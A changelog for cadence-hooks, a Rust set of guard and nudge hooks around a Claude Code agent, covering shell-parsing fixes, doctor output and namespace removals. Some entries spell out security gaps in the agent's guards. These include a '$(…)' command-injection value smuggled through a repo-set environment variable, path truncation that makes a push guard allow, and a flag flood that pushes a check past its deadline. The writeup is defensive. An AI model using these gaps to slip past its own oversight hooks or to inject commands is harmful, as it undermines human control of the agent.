- **Two deliberate placements are now sanctioned rather than reported as violations,** since the un-skipped assertions reach them. `INTENTIONAL_CROSS_PLUGIN_HOOKS` exempts `cadence` → `session persist-plan` (the hook must ride the always-on cadence plugin while `session` is its clap namespace — #348, cameronsjo/cadence#507) and `cadence-canon` → `guardrails inject-gh-context` (present in canon's manifest at the subtree-add commit, canon is its only registrar anywhere, and it sits in canon's SessionStart block beside `session start` and `session backstop-warn`). `KNOWN_DISTINCT_SETTINGS_SCRIPTS` gains `session-start.sh` and `warn-user-dot-claude-as-a-deploy-target.sh`, both keyword-heuristic false positives that would have turned an operator's machine red.

- **`parse_work_dir` lets a newline terminate a `cd` target (cameronsjo/cadence-hooks#394, #368).** Both issues were filed as a writer/reader keying divergence in the polish marker — worktree gitdir vs common dir. That diagnosis is **wrong**: `record-polish` and `polish_marker_present` have both keyed on the canonicalized `git_common_dir` since 0.60.0, and the clean worktree case reproduces silent. The real defect was in the *reader's cwd resolver*, and it was two characters wide. `CD_PATTERN`'s bare-path class was `[^ &;|]+`, which excludes a space but not a newline, so the shape that actually shipped — `cd <worktree>` ⏎ `gh pr create` — captured the target as `<worktree>\ngh`. No such directory exists, `GitState::resolve` returned `None`, and the gate nudged. The marker had been correct the whole time. The class is now `[^\s&;|]+` — the entire fix.

  **A newline is deliberately NOT added to the separator alternation.** Doing so would additionally recognize a `cd` on its own line *after* an earlier command, which neither issue reports. It creates no new bypass class — `^`, `&&`, `;`, and `||` all reach the identical steering today — but it converts a rarely-tripped mis-resolution into a routinely-tripped one: this repo's own docs carry 7 line-start `cd` occurrences against 1 `;`-spelled, `\s*` means an indented `cd` inside a fenced code block matches too, and `cd ~/...` expands to a directory that really exists, so those become live re-points. The triggering shape is `gh pr create --body-file - <<'EOF'` with a shell snippet in the body — what this tool composes constantly. A wider accidental-trigger surface on a primitive three block-capable guards resolve through is the wrong trade for a nudge-only false positive.

  **The class names bash's default IFS literally — space, tab, newline — rather than `\s`.** This crate takes `regex` with default features, so a bare `\s` means `\p{White_Space}`: U+00A0, U+2028, U+3000 and friends. Every one of those is an *ordinary* character in an unquoted bash word, so a Unicode-aware class truncates a path bash keeps whole — and that divergence runs in the fail-open direction, since a truncated prefix can name a **different real checkout** than the one the command runs in (`~/Projects/cadence<U+00A0>fork` truncating to an owned `~/Projects/cadence`), and `guard-push-remote` allows when it cannot resolve a git dir. A security review of this change caught it; the literal IFS class is the only spelling that cannot invent a target.

  **`parse_work_dir` now strips heredoc bodies first, the way `split_segments_with_ops` already did.** A heredoc body is data bash never executes, so a `cd` written in prose there must not re-point the resolver — and `mkdir -p <dir> && cd <dir>` is the most ordinary shell idiom in documentation. The asymmetry mattered more after the newline fix than before it: the old class captured `<dir>\n<next-word>`, which cannot exist, and the two consumers that treat an *unresolvable* target as a deliberate fail-closed block (`git_safety`'s bare-HEAD force-push check, `guard_gh_write`'s ownership check) blocked loudly. Once the target resolves to a real checkout, those same consumers silently judge the wrong directory instead. The segmenter had stripped heredocs for exactly this reason since it was written; this resolver had not, and closing that gap turns a silent wrong answer back into a correct one rather than merely restoring the accidental block.

  **This remains a raw-string scan, not a shell parse.** It does not model subshells, pipelines, or backgrounding: a `cd` in any of those still resolves as though it applied to the parent, even though bash gives it its own process and discards it. That is pre-existing behavior, unchanged here.

- **`is_polish_ship_anchor` sees two more ship shapes (cameronsjo/cadence-hooks#303).** A ship wrapped in a shell invocation (`sh -c 'gh pr create --title x'`) was invisible because the quoted script collapses to one token — the predicate now evaluates `command_segments`, which expands `sh|bash|zsh|dash -c` wrappers. And a gh global flag before the subcommand (`gh --repo owner/r pr create`) broke the strict `[gh, pr, create]` adjacency window; detection now walks forward from the `gh` command word, skipping `-`-prefixed tokens and consuming one extra token after a bare `--repo`/`-R`, before requiring a literal `pr`. Both misses were pre-existing and fail-open — the cost was a missed nudge, never a bypass or a false block. Per-segment draft scoping survives both changes, so `sh -c 'gh pr create --draft'` is still correctly skipped, and every existing negative (`gh pr list`/`view`/`merge`, `gh issue create`, a quoted `'gh pr create'` phrase, a `gh-pr-create-*` branch name) still rejects because the walk demands a literal `pr` token.

  The `gh` scan resumes from where each walk stopped rather than restarting at the next token. A `--repo` skip can hop over a later `gh`, which made the walk unamortized — a crafted `gh --repo` flood was O(n²), enough at composed-command sizes to push the check past its deadline. Resuming keeps it linear and cannot lose a match, since a `gh` the walk hopped over was by construction being consumed as a flag's value.

  Worth recording: the anchor now reads `command_segments` while `parse_work_dir` remains a raw-string scan, so the predicate that decides *whether* a segment ships and the resolver that decides *where* it ships from do not see the same view of the command. In `sh -c 'cd /x && gh pr create'` the ship is seen but the `cd` is not, so the segment is judged against the unchanged cwd. That gap pre-dates this change; moving the anchor widens it. Tracked as cameronsjo/cadence-hooks#419, together with the related shape a security review of this change surfaced — `command_segments` expands a double-quoted `$(…)` body, so `git commit -m "$(echo gh pr create)"` now fires the anchor where the single-quoted form still does not. Both close the same way, by requiring `gh` to be a segment's command word rather than matching at any position, and both are nudge-only.

- **`try` no longer writes a real plan doc when demonstrating `session persist-plan`/`persist-plan-approval`.** `sample_payload_with_cwd` unconditionally overwrites every sample payload's `cwd` with the real `current_dir()` — correct for the overwhelming majority of hooks, which only read git/repo state, but dangerous for these two: a bare `cadence-hooks try session persist-plan-approval` actually created a plan doc in whatever repo the operator ran it from (cameronsjo/cadence-hooks#396 review — verified end to end, a file landed in a real repo during review and had to be removed by hand). A new `CWD_OVERRIDE_REFUSED` allowlist in `try_hook.rs` keeps these two subcommands' sample `cwd` exactly as the registry declared it — a deliberately nonexistent path — instead of overwriting it, so `repo_root`'s `git -C <cwd> …` spawn fails deterministically and `try` demonstrates the hook's real "not a git repo" fail-open arm rather than ever reaching the write path.

### Changed

- **`doctor`'s `panic` and `stdin-parse` findings name the last recorded error, and both remediations hand over a command that runs.** The panic diagnosis gains `; last error: <…>`, the parse recency clause gains the same, and "inspect failopen.jsonl" / "inspect failopen.jsonl for the namespace/subcommand" become a copy-pasteable `grep '"reason":"panic"' "<metrics-dir>/failopen.jsonl" | tail -5` (path double-quoted, since the metrics dir routinely sits under a home directory that may contain spaces). A ledger of v1 rows simply omits the clause — no empty `last error:` and no literal `null`. `recent_failopen_report` now takes a slice of reasons and returns a `HashMap` keyed by reason rather than one reason and a bare `Option`, so a caller asking about two reasons cannot mis-attribute one's recency to the other.

  **The rendered path is single-quoted, not double-quoted.** These remediations are built to be pasted into a shell, and the metrics dir is env-derived (`CADENCE_METRICS_DIR`, else a `CLAUDE_CONFIG_DIR`-derived path) — while Claude Code injects env vars from a project's `.claude/settings.json`, which repositories check in. Inside double quotes `$`, backticks, `\` and `"` all stay live, so a cloned repo setting `CADENCE_METRICS_DIR='/tmp/m$(…)'` could have made `doctor` print a command that executes something else on paste. Double-quoting solves spaces and nothing more. A `shell_single_quote` helper (POSIX `'\''` escaping) now wraps every value interpolated into a pasteable command.
- **`tests/version_mismatch.rs` no longer writes into the operator's live metrics ledger.** Its synthetic subcommand names (`nonexistent-hook`, `not-a-real-hook`, `zzz-future-hook`, `some-hook`, `guard-new-feature`) were landing in the real `failopen.jsonl` and inflating `doctor`'s own counts — the third finding in #398. The shared spawn helper now points `CADENCE_METRICS_DIR` at a per-test temp dir. `tests/selective_disable.rs` has the identical leak and is a deliberate follow-up, not part of this change.

- **README's hook table was stale and is now regenerated from the registry** — `45 hooks across 7 namespaces` against a registry that actually held 66. Every per-namespace count was wrong too (cadence 12→14, guardrails 21→26, rules 2→4, metrics 3→9, session 4→10). Now `64 hooks across 6 namespaces`, matching `cadence-hooks list` exactly.
- **`doctor`'s `stdin-parse failure` finding now carries recency + version context**, so a burst whose fix already shipped reads differently from a live wiring problem. The diagnosis gains when the reason last fired, on which binary version, and how many of the windowed rows are on the *current* binary — e.g. `221 stdin-parse failure(s) in the last 7 days (failopen.jsonl; last: 2026-07-20T20:51:00Z on 0.61.0 — none on current 0.66.0)` — and the remediation notes that no failures on the current version usually means the feed was already fixed, so check the CHANGELOG before chasing wiring. The *count* stays window-wide (unlike `version_mismatch`, a bad-stdin feed problem is not version-specific, so filtering it would under-report a live one); only the presentation gains the disambiguating fields, surfaced from data already in each row (`ts`, `binaryVersion`) by a single `recent_failopen_report` read that returns the counts and the parse recency together. Motivated by the cameronsjo/cadence-hooks#356 burst, whose fix shipped in 0.64.0 yet warned identically for the full 7-day window as it aged out.

### Removed

- **The `lab` namespace and the self-representation persona ledger are gone (`lab persona-nudge`, `lab persona-gate`).** The feature captured a constrained per-session self-description into an append-only JSONL ledger; it never went into service — disabled in settings, ledger never created, and the only residue an empty staging directory frozen at the one minute its SessionStart nudge ran. The block path never fired. It was carrying a real enforcement footprint the whole time: two registered hooks, one of them block-capable via four `loop_block` sites. The registry drops 66 → 64 entries (block-capable 19 → 18, nudges 36 → 35), and the `lab` command group is deleted outright rather than left as an empty group — an empty `LabCommands` compiles but ships a broken surface (`lab` still in `--help`, `cadence-hooks lab <anything>` exiting 2). With the group gone, a stale plugin still dispatching `lab persona-gate` gets **exit 1 with `unrecognized subcommand`**, which is what keeps the wrapper's fail-open path working. The `crates/lab` crate is kept as a dormant, empty landing pad for the next experiment; nothing links against it. Removing the feature also removes its own mitigations — the gate was a *writer*, appending to a global ledger through an unlocked read-modify-write-rename its own doc comment called "not concurrency-safe" — so the net effect is a smaller write surface under the config dir. The marketplace side shipped first (cameronsjo/cadence-lab#13), so the catalog stopped advertising persona before this binary stopped answering it.
- **`hook_latency`'s namespace allowlist drops `lab`** (`NAMESPACES`, 7 → 6). This is the production allowlist that decides which `run-cadence-hooks.sh <ns> <sub>` labels `doctor` will echo out of a log line; a retired namespace left in it is a dead entry in a live guard.

## [0.67.0] - 2026-07-24

### Added

- **New `cadence platform-drift` SessionStart check** nudges when the installed cadence-hooks binary or Claude Code has drifted behind a plugin-shipped `platform-baseline.json`. Work-machine-safe: the cadence-hooks half compares the compiled binary version against the baseline file only (no network); the Claude Code half resolves the running platform version from the transcript's last assistant line (`transcript::last_assistant_harness_version`), never a network call. Nudges when major/minor differ at all, or patch delta is >= 5 within the same major.minor. A cold `source:"startup"` transcript has no assistant line yet, so the Claude Code half silently skips on fresh starts — an accepted limitation; the nudge effectively fires on resume/clear/compact sessions. `cadence-hooks doctor` reports both version comparisons unconditionally (no threshold) via a local `claude --version` exec and a newest-pin glob of the marketplace cache. Version held — bundling with the frontmatter-allowlist PR into one release.
- **`validate-skill-frontmatter` allowlists 5 more platform frontmatter fields: `when_to_use`, `arguments`, `disallowed-tools`, `effort`, `shell`.** Spellings and enum sets (`effort` ∈ low/medium/high/xhigh/max, `shell` ∈ bash/powershell) verified against the raw Claude Code docs. `effort`/`shell` get house-strict unquoted-only enum validation mirroring `BOOLEAN_FIELDS`; `when_to_use`/`arguments`/`disallowed-tools` are allowlisted with no value validation.
- **Cross-sibling namespace-parity audit test.** `tests/hook_registration_audit.rs::namespace_list_matches_redact_check_sh` now diffs `redact_external_content::NAMESPACES` (newly `pub`) against the sibling plugin's `redact-check.sh` `NS='...'` alternation as sets, catching drift between the Rust and bash namespace blocklists. Mirrors the existing sibling-resolution and silent-skip posture used by `all_binary_subcommands_are_registered` — no sibling checkout, no failure.
- **Hardened the namespace-parity audit's sibling resolution and `NS=` parsing.** The skip now keys off the sibling plugin's `skills/redaction` *directory* existing (mirroring `all_binary_subcommands_are_registered`'s directory-keyed skip), not the script file itself — so a present plugin checkout with a moved or renamed `redact-check.sh` fails loudly instead of silently skipping. `parse_redact_check_namespaces` now collects every `NS='...'` line and asserts there's exactly one, rather than trusting the first match. Also extracted a shared `workspace_root()` helper (was duplicated three times) and marked `NAMESPACES` `#[doc(hidden)]` as an in-repo test-linkage exposure, not a supported public API.

## [0.66.0] - 2026-07-23

### Changed

- **`validate-skill-frontmatter` now rejects a `plugin:` prefix in a skill's `name` (cameronsjo/cadence#545).** Claude Code builds a skill's invocation id from `<plugin>:<directory>` and, as of **2.1.216** ("fixed plugin skills with a `name` frontmatter field losing their plugin prefix in slash-command autocomplete"), prepends the prefix itself — so a declared `name: cadence:tend` renders as `/cadence:cadence:tend` in the slash menu. `NAME_PATTERN` drops the optional `namespace:` group it gained in 0.19.0, and the name-vs-directory check becomes a direct comparison now that the post-colon suffix cannot exist. **This reverses 0.19.0**, which relaxed the guard to permit the prefix after **2.1.94** made plugin skills use the frontmatter `name` as the invocation name. The cadence ecosystem was swept bare in the same change (142 skills across cadence, cadence-lab, and auditing-claude-md).

  **If the platform flips back** — e.g. Anthropic de-duplicates an already-prefixed name — **relax the pattern and ship a release BEFORE sweeping the corpus.** Tightened as it stands, this check blocks every edit to a prefixed `SKILL.md`, including the sweep that would undo it. The sweep itself is `cadence/scripts/skill-names.py --bare|--prefixed`, which runs in either direction.

## [0.65.0] - 2026-07-23

### Added

- **`validate-skill-frontmatter` accepts the `background` field and enforces strict booleans.** Claude Code 2.1.218 made `context: fork` skills background-by-default with `background: false` as the per-skill opt-out; the field allowlist now admits `background` so the opt-out is writable. New value-validation applies one rule to all three boolean fields (`background`, `disable-model-invocation`, `user-invocable`): exactly `true` or `false`. The platform also accepts `yes/no/on/off/1/0` as of 2.1.218 — cadence deliberately does not; one spelling keeps the skill corpus greppable.

### Fixed

- **`warn-subagent-worktree` no longer nudges on a structurally read-only dispatch (cameronsjo/cadence-hooks#331).** The built-in `Explore`/`Plan` `subagent_type` values have their own tool grant exclude `Edit`/`Write`/`NotebookEdit` — nothing can land in the worktree or the primary checkout either way, so isolation is moot. These two are now exempted. A plugin-provided or custom-instructed read-only dispatch (e.g. `cadence:explorer`, or a `general-purpose` agent told "read-only" in its prompt) is not detectable today — whether the Agent tool's `PreToolUse` payload even carries the dispatch prompt text is an open question (cameronsjo/cadence-hooks#374) — and still nudges; documented as a known false-positive class in the check's doc comment.
- **`enforce-worktree`'s subprocess-mutation nudge no longer over-fires on a redirect target with an unresolved `$VAR` or backtick reference (cameronsjo/cadence-hooks#362).** A relative redirect/mutator target like `cat > "$SCRATCH/f"` was joined onto the effective directory verbatim (`<cwd>/$SCRATCH/f`) since the scoped walk carries no assignment/substitution expansion — this fabricated an in-primary path regardless of what `$SCRATCH` actually resolved to, false-nudging on legitimate out-of-tree writes (e.g. a `/tmp` scratch-dir redirect). Such a target is now skipped rather than resolved — a silent miss, which is the safer default for an advisory-only check. An absolute target with a `$VAR` component (e.g. `/tmp/$SESSION/f`) is unaffected.
- **`session declare` falls back to `CLAUDE_CODE_SESSION_ID` when `CLAUDE_SESSION_ID` is unset (cameronsjo/cadence-hooks#366).** A shell Claude Code spawns via its Bash tool does not carry `CLAUDE_SESSION_ID` in its environment, so `session declare`/`session status` couldn't self-identify without an explicit `--session-id`. Mirrors the existing `dismiss_main_branch_warn.rs` precedent. The priority order (flag → `CLAUDE_SESSION_ID` → `CLAUDE_CODE_SESSION_ID`) is now a pure, fixture-testable function (`resolve_session_id_from`) rather than reading `std::env` inline.
- **`redact-external-content` allowlist entries now suppress an exact-match non-skill-id hit (cameronsjo/cadence-hooks#318).** A colon-free `.claude/cadence.json` `redaction.allowlist` entry previously suppressed only `skill-id` hits (as a bare-namespace prefix match); it was silently inert for `local-path`/`marketplace`/`harness-noun` hits, even one whose snippet equaled the entry exactly. A repo whose own domain vocabulary includes a harness noun (e.g. a transcript-viewer tool discussing "transcript") had no way to allowlist that literal term short of suppressing the whole category via a `categories.<name>.ceiling` override. Now a colon-free entry exact-matches any non-skill-id hit's snippet. Automatic repo-visibility detection (this issue's other suggested facet) is declined — it would need a network call (`gh repo view`) in a hot-path PreToolUse guard, and this repo's other guards already show real latency/cancellation cost under slow subprocess I/O (#271); the existing per-repo `originAudience` config knob is the intended manual escape hatch for that case.
- **`prevent-secret-leaks` allowlists `forgectl env`'s value-free subcommands (cameronsjo/cadence-hooks#315).** `forgectl env keys`/`set`/`get`/`check`/`redact` are structurally value-free on stdout by design (cameronsjo/forgectl#82) — the guard was blocking every one of them anyway because a `.env`-shaped `--file` operand made the whole command look like a leak, the exact catch-22 the tool was built to avoid. `forgectl` command groups other than `env` still get no free pass.
- **`warn-commit-provenance` nudges once per session, not once per commit (cameronsjo/cadence-hooks#370).** A session making many commits under an explicit no-trailer message contract (e.g. a dispatched implementer following a fixed commit-message spec) saw the provenance nudge fire on every single commit — pure noise once the session already knows the trailer format. Reuses the `session_marker`/`write_marker` primitive already established by `warn-main-branch`, scoped globally (not per-repo) since "does this session know the trailer format" is a session-level fact.
- **`warn-subagent-worktree`'s message names a known false-positive shape (cameronsjo/cadence-hooks#371).** The check can only see structural signals (`isolation`, cwd, sibling-worktree count) — the dispatch prompt text itself isn't in the hook payload today, so a dispatch whose prompt has the agent create and operate on its own explicit worktree (`git -C <repo> worktree add ...`, then `git -C <path>` throughout — the `orchestrating-issue-slates` pattern) still nudges even though the work lands exactly where intended. The nudge now names this case explicitly so an operator can recognize and disregard it rather than learning to ignore the warning broadly.
- **`try` no longer writes real metrics rows into the production metrics dir (cameronsjo/cadence-hooks#269).** `cadence-hooks try metrics <logger>` self-execs the compiled binary against a generated sample payload, but metrics loggers write unconditionally and silently — a `try` run had appended a real row to the live `skills.jsonl` stream. `try_hook.rs` now sandboxes the self-exec'd child to a scratch tempdir via `CADENCE_METRICS_DIR` (best-effort: if the scratch dir can't be created, a stderr warning names the risk instead of silently falling back to the real dir). `tempfile` promoted from a dev-dependency to a real one in the root crate.

## [0.64.0] - 2026-07-21

### Fixed

- **`MetricsInput`/`HookInput` tolerate non-object `tool_response`/`tool_input` shapes (cameronsjo/cadence-hooks#356; PR #363).** The heartbeat logger (the sole PostToolUse `matcher:"*"` logger) was recording ~242 stdin-parse failures per 7 days: a tool's `tool_response` shape varies by tool — a plain string (`Read`), an array (`Glob`), a Bash-style object (`Bash`) — but both input structs typed it as a strict struct, and because `from_json` parses the whole payload at once, one mismatched field failed the **entire** parse and silently dropped the metrics row (fail-open, zero symptom). A `lenient_option` deserializer degrades a shape-mismatched typed field to `None` instead of failing the payload; for enforcement (`HookInput`) this also stops a weird `tool_response` from blinding a guard that only needs `tool_input`.

### Removed

- **`metrics log-plan-phase` subcommand removed (cameronsjo/cadence#506; PR #363).** Claude Code's platform never delivers plan-mode tool events (`EnterPlanMode`/`ExitPlanMode`) to PostToolUse hooks, so `plan-phases.jsonl` recorded zero rows since it shipped. Removed the subcommand, its module, the unused `PLAN_PHASE_SCHEMA_VERSION` const, and all registry/dispatch/clap wiring. The plugin-side wiring is removed in cameronsjo/cadence#528; the live plan-approval signal is captured by `plan-links.jsonl` (persist-plan).

## [0.63.0] - 2026-07-20

### Changed

- **`enforce-worktree` no longer borrows its carve-out predicates from `warn-main-branch` (#164 PR4a; PR #288).** `git_dir_for_input`, `is_claude_managed_dir`, and `is_plan_doc_dir` now come from `core::worktree` directly, dropping the cross-guard import that made the guards' layering circular. Internal refactor — no behavioral change to either guard; PR4b (the resolution split) stays deferred.

## [0.62.0] - 2026-07-20

### Added

- **`cadence-hooks session warn-commit-provenance` — warn-tier nudge toward producer-tuple commit trailers (cameronsjo/cadence#473; PR #360).** PreToolUse Bash check on git-commit commands: when the composed message lacks `Session-Id:`, warns with a fully-computed, copy-ready trailer block — Session-Name (canon `identity::generate_name`), Session-Id (payload), Model (`transcript::last_assistant_model`), Harness (the transcript's top-level `version` via the new `transcript::last_assistant_harness_version`, `AI_AGENT` env fallback), Machine (`provenance::machine_digest`). Message extraction covers inline `-m`/`--message` (repeated flags concatenated with git's paragraph semantics), heredoc-in-command-string (bash-faithful `<<`/`<<-` terminator semantics), and `-F`/`--file` (cwd-relative, 64 KiB metadata-checked cap, scan-only — file content never reaches any output). Untrusted transcript/env-derived fields are sanitized (`identity::sanitize_field`) before interpolation; `catch_unwind` self-guard; any unresolvable tuple field is omitted, never guessed; every failure path allows (ADR-0001). Adversarial security review (guard-feeding parser lens) + code-review seat before merge. Plugin wiring (cadence-canon, `if: Bash(*git commit*)`) is a release-gated companion.

### Changed

- **`session persist-plan`'s provenance block is unified with the producer tuple (cameronsjo/cadence#248; PR #359).** The parent-transcript scan now returns the approving session's tuple — id, model, harness version — read from the same matched ExitPlanMode assistant line, and `Approved in:` renders `<name> (<id>) [<model>, claude-code <version>] @ <machine>`; the executing line carries name and id. Missing fields degrade gracefully (single-field bracket, or none — never empty brackets); no parent found stays the literal `Approved in: unknown`. The committed block's machine field is now a salted hostname digest — new `provenance::machine_digest`, `sha256(hostname + "cadence-prov-v1")` hex-truncated to 12, pinned by a known-vector test — never the raw hostname; `plan-links.jsonl` (local metrics) keeps the bare host.

## [0.61.0] - 2026-07-20

### Added

- **`cadence-hooks session persist-plan` — deterministic plan persistence on UserPromptSubmit (#348, cameronsjo/cadence#505).** Intercepts the harness-injected `Implement the following plan:` prompt (the approve-and-clear UI path, where the conversational save rule can never fire) and persists the plan body to `<repo>/docs/plans/<local-date>-<slug>.md` with a provenance block (exact body-hash parent resolution against sibling transcripts — `unknown` over fuzzy), body-hash idempotency over an O_EXCL suffix ladder (never overwrites), a `plan-links.jsonl` linkage row (schemaVersion 1), and a context line naming the persisted path. Strips both pinned harness suffix paragraphs before hashing; bounded transcript scan (≤48 h, ≤20 files, ≤32 MiB each, streamed); narrow panic guard; every failure path exits 0. Enabling core changes: `HookEvent::UserPromptSubmit`, `HookInput.prompt`, `time::local_date()`; new deps `gethostname`, `sha2`. Wiring ships in the cadence plugin (cameronsjo/cadence#507).

### Changed

- **`guard-gh-write` unblocks read-only and curated review-thread GraphQL, keeps arbitrary mutations closed (#262, #263, #300, #317; PR #342).**

### Fixed

- **`guard-rm` allows file-scoped artifact/temp deletes and corrects the bypass hint (#322, #316, #311; PR #341).**
- **`prevent-secret-leaks` scopes the echo/printf nudge to expanded secret-shaped vars (#332, #333, #334, #321; PR #340).**

## [0.60.0] - 2026-07-19

### Added

- **One per-repo guard config: `.claude/cadence.json` (#153).** The two independently-grown per-guard files (`.claude/redaction.json`, `.claude/terminology.json`) unify into a single namespaced file, each guard reading its own top-level section (`redaction`, `terminology`) via a new fail-open generic `core::config::load_cadence_section<T>` — each guard keeps its existing `*Config` struct, no types move across crates. The read routes through the hardened `read_untrusted_config` (1 MiB cap, regular-file-only), so a missing file, unreadable/oversized/special file, non-UTF-8, malformed JSON, absent section, or shape mismatch all yield the guard's default config (ADR-0001). A `version: 1` envelope plus permissive handling of unknown top-level keys makes future sections additive — a repo may hand-author the reserved `nudges` block (#216) early without breaking. Decision and the frozen #216 schema recorded in `docs/adr/0002-unified-cadence-config.md`.
- **`cadence-hooks migrate-config` (#153).** Converts a repo's legacy config in one step: merges each legacy file into its `cadence.json` section, then renames the consumed file to `*.json.migrated` (reversible breadcrumb) rather than deleting. Never clobbers a section already present (leaves that legacy file in place to reconcile); idempotent; preserves unknown top-level keys; refuses to proceed on a non-object `cadence.json` rather than destroy content; renames only after the write succeeds. Scannable TTY-aware summary (payload to stdout, diagnostics to stderr, honors `NO_COLOR`), non-zero exit on any error.
- **`cadence-hooks doctor` warns on orphaned legacy config and a malformed `cadence.json` (#153)** — the hard cut's non-silent net. In default mode, doctor resolves the current repo's git root and warns (never errors) when a legacy `redaction.json`/`terminology.json` is present (no longer read → points at `migrate-config`) or when `cadence.json` is present but not valid JSON (runtime fails open to default config, so the repo's softening silently stops applying). Repo-scoped, so it is skipped under `--root`, matching the live-machine-only gating of the existing checks.

### Changed

- **The `terminology` and `redact-external-content` guards now read from `.claude/cadence.json` — a hard cut (#153).** The legacy `.claude/terminology.json` / `.claude/redaction.json` are no longer read; both guards' `*Config` structs and all downstream behavior are byte-for-byte identical, only the file read changed. Run `cadence-hooks migrate-config` to convert a repo (or hand-author `cadence.json`); doctor warns on an orphaned legacy file. **Migration:** write `cadence.json` before upgrading the binary, then upgrade, then rename the legacy file — a zero-gap order (the old binary ignores the unknown `cadence.json` and still reads the legacy file; the new binary reads `cadence.json`).

- **Ten chattiest hook messages tightened ~25%, duplicated strings consolidated (#327, PR #328).** Each message now carries verdict + the one fix + one pointer instead of its full pedagogy per fire; literal-duplicate strings (worktree recipe, not-configured, repo-delete template, key-material clause) moved to shared constants so a wording change lands once. `inject-gh-context` renders owner and repo allowlist entries as one combined list.
- **`warn-overshare` no longer exempts retro paths (#329, PR #330).** `cadence:retro` relocated its output out of the repo (vault primary, gitignored fallback — cameronsjo/cadence#499), so `docs/blog/*retro*` paths have no sanctioned personal content and now get the normal audit; the exemption is vault-paths-only.

### Fixed

- **Polish marker is worktree-stable (#324, PR #326).** The marker key now uses the canonicalized `git-common-dir` instead of `--show-toplevel` on both the record and read sides — a polish recorded from a linked worktree satisfies a ship command run from the primary checkout on the same branch, and vice versa. Old-key markers age out; no compat shim.

## [0.59.0] - 2026-07-15

### Fixed

- **`enforce-worktree` exempts a commitless (unborn-HEAD) primary checkout, so the first commit of a brand-new repo is no longer blocked with a mechanically-impossible remedy (cadence-hooks#309).** The block turns on `is_primary_checkout` alone, so the very first commit of any fresh `git init`'d repo blocked — yet the remedy the block prints (`git worktree add -b <branch>`) needs a commit to branch from, an unborn HEAD has none, so the bootstrap commit *must* land in the primary checkout. `assess_dir` — the single chokepoint every arm routes through — now exempts a repo with **zero commits reachable from any ref** (`git rev-list --count -n1 --all == 0`, probed lazily on the would-block path only, memoized on `GitProbe`). The predicate keys on "any commit anywhere", **not** the current HEAD: a `git checkout --orphan` / `git update-ref -d HEAD` established repo still has commits (a worktree is still possible off the surviving refs) and still blocks — closing the bypass a naive current-HEAD-unborn test would open. Fails closed via `git_command_detailed`'s tri-state — only an affirmative `Value("0")` exempts; a probe error or deadline timeout keeps the block. Covers all three arms (Edit/Write, the Bash `git commit` channel, and the mutation-nudge channel) with one carve-out; the exemption evaporates at the first commit.

## [0.58.0] - 2026-07-11

### Changed

- **`enforce-worktree` resolves repo/worktree identity entirely through `core::gitstate::GitState` — a pure filesystem walk — and spawns zero `git` (cadence-hooks#164, the final umbrella PR; the only BLOCK guard).** The per-invocation `GitProbe` memo swaps its `git rev-parse --show-toplevel` / `--path-format=absolute --git-common-dir` subprocess probes for one memoized `GitState::resolve` per directory; the `common_dir`/`repo_root` accessors keep their string return types because `GitState` canonicalizes both to the same `--path-format=absolute` form the old probes returned, so every call site — the Edit/Write same-repo scoping, the `git commit` cross-repo guard, #234's subprocess-mutation-nudge channel, the snooze marker, and the block message — is byte-for-byte unchanged (all 130 enforce unit tests pass; verified end-to-end that a primary-checkout edit blocks, a worktree edit allows, a worktree-session edit into its own primary still blocks, and a `sed -i` mutation in a primary still nudges). The **#271 upshot:** enforce-worktree no longer spawns `git` at all, so it is now *immune* to a slow or hanging `.git` rather than merely bounded against it — its two `deadline_failopen` cases flip from "times out and records a deadline row" to "resolves instantly, records nothing."
- **`GitState::resolve` returns `None` for a nonexistent `start` path, matching git's `-C` failure (cadence-hooks#299).** Previously the underlying `find_git_root` walked lexical ancestors past a not-yet-created leaf directory up into the enclosing repo and reported *that* repo's state — so `cd <nonexistent> && git push` / `git commit` could resolve the parent repo's branch for a command the shell never runs (a spurious nudge, or — for the BLOCK-guard migration above — a would-be false block). The `enforce-worktree` Edit/Write arm ascends to the nearest existing ancestor before resolving, so new-file writes are unaffected.
## [0.57.1] - 2026-07-11

### Fixed

- **`is_polish_ship_anchor` scopes its `--draft`/`-d` check to the `gh pr create`'s own shell segment (cadence-hooks#297).** The 0.57.0 predicate located the `create` position with a 3-token window but scanned the *whole* token stream for the draft flag, so a bare `-d` from an unrelated sibling command on a compound line (`curl -d x && gh pr create`, `docker run -d img ; gh pr create`) misclassified a genuine non-draft ship as a draft and silently suppressed both the nudge and the `log-polish-nudge` metrics denominator. `-d` is a common short flag, so this false negative inverted #297's intent for exactly the scripted multi-command shape the codebase anticipates. The anchor is now evaluated per shell segment (`split_segments`) so the draft-flag scan sees only the create's own args — mirroring the repo's "find the subcommand position, then scan its scope" pattern. A genuine draft in its own segment still skips, and `gh pr ready` after a sibling `-d` still anchors. Caught by the `cadence:code-reviewer` gate on #297 after the initial ship.

## [0.57.0] - 2026-07-11

### Changed

- **`warn-branch-base` and `nudge-upgrade-after-push` resolve the current branch through the shared `core::gitstate::GitState` (cadence-hooks#164, PR5).** Two more `git branch --show-current` spawns collapse onto one pure-filesystem `HEAD` read — `GitState.branch` is behaviorally identical (a detached HEAD → `None`, matching the old empty-string→`None` normalization; an unborn branch still reports its name). Verdicts characterization-locked (real-repo tests unchanged). The other two family branch resolvers are handled separately: `warn-main-branch`'s (`symbolic-ref`) folds into its own PR3 migration, and `guard-push-remote`'s stays gated because it is a **BLOCK** guard whose branch feeds the remote-ownership decision — not the Sonnet-tier swap the plan assumed.
- **`nudge-polish-before-pr` is re-anchored from `gh pr create` to the *ship moment* — `gh pr ready` plus a non-draft `gh pr create` (cadence-hooks#297).** Two workflow shifts had moved the real PR work out from under the old anchor: entry posture (cadence#278) opens a **draft PR at worktree entry**, so the only `gh pr create` in a lane's life now happens at zero diff where polish is meaningless, and fleet-pickup sessions ship via `push → gh pr ready → gh pr merge` — none of which the gate matched. The nudge had degraded from "fires when a PR becomes real" to "fires once per branch when there is nothing to polish." A new quote-safe `core::shell::is_polish_ship_anchor` (built on `tokenize`, replacing `is_gh_pr_create`) recognizes `gh pr ready` and a **non-draft** create while skipping a `--draft`/`-d` create; `gh pr merge` is deliberately excluded (an orchestrator often runs it from `main`/another cwd, so the branch mis-resolves and false-nudges). The branch-scoped polish marker is session-independent, so whoever runs the ship command resolves the same marker a completed `/polish` wrote. The `log-polish-nudge` metrics denominator moves to the same predicate so the logged set still equals the nudge-fire set. Fail-open floor (ADR-0001) and the loophole clauses are unchanged.
